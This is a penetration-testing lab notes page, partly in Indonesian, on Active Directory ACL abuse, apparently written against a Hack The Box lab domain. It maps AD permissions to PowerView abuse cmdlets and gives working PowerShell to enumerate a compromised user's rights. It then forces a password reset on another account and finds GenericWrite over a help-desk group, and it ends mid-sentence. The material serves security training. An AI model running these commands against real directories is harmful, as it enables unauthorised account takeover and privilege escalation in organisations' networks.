---
layout: default
---
# ACL - Enumeration &  Abuse

## Why are ACEs Important?

💡 Attackers utilize ACE entries to either further access or establish persistence. 
These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the  impact that these can have if applied incorrectly. 
They cannot be  detected by vulnerability scanning tools, and often go unchecked for  many years, especially in large and complex environments. During an assessment where the client 
has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. 
Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:



```bash
	
ForceChangePassword:  abused with Set-DomainUserPassword
Add Members:  abused with Add-DomainGroupMember
GenericAll:  abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite:  abused with Set-DomainObject
WriteOwner:  abused with Set-DomainObjectOwner
WriteDACL:  abused with Add-DomainObjectACL
AllExtendedRights:  abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself:  abused with Add-DomainGroupMember
```

## ACL Enumeration With Powerview

**Assume we have username wley as compromised user**

### ForceChangePassword
#### using Get-DomainObjectACL
````
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

##Vulnerable Output
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529

# ObjectAceType with above value meaning for Force-change-password
(https://learn.microsoft.com/id-id/windows/win32/adschema/r-user-force-change-password)
````


#### Using -ResolveGUIDs Flag
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

##output Yang Diharapkan
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
```

#### Enumerate All User
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

```

### Abusing Force Change Password
**changing wley password without knowing his old password**

1. Store Password user kita ke powershell credential
   
```powershell
   PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD Kita >' -AsPlainText -Force
   PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

3. Kemudian create password dari user target (eg disini user damundsen yang bisa kita ganti)
```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

#### Generic Write

```powershell
# Generic All Enumeration
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
*Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. and with 

```
